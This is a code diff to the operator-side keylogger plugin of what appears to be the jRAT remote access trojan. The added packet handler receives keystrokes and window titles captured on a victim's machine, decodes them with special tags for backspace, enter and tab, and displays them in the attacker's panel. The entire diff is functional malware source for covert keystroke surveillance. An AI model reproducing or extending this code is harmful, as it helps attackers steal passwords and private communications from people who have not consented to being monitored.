@@ -1,6 +1,7 @@
 package pro.jrat.client.keylogger;
 
 import java.awt.event.ActionListener;
+import java.io.DataInputStream;
 import java.io.File;
 import java.util.ArrayList;
 import java.util.List;
@@ -37,7 +38,40 @@ public class Plugin extends RATPlugin {
 	}
 
 	public void onPacket(OnPacketEvent event) throws Exception {
+		DataInputStream dis = event.getServer().getDataInputStream();
 		
+		if (event.getPacket().getHeader() == STATUS_HEADER) {
+			int len = dis.readInt();
+			System.out.println("Length: " + len);
+			
+			for (int i = 0; i < len; i++) {
+				boolean isKey = dis.readBoolean();
+
+				if (isKey) {
+					char ckey = dis.readChar();
+
+					String key = Character.toString(ckey);
+
+					if (ckey == '\b') {
+						key = "[BACKSPACE]";
+					} else if (ckey == '\n' || ckey == '\r') {
+						key = "[ENTER]\n\r";
+					} else if (ckey == '\t') {
+						key = "[TAB]\t";
+					}
+
+					if (panel != null) {
+						panel.append(key);
+					}
+				} else {
+					String title = dis.readUTF();
+
+					if (panel != null) {
+						panel.append("[Window: " + title + "]");
+					}
+				}
+			}
+		}
 	}
 
 	public String getName() {
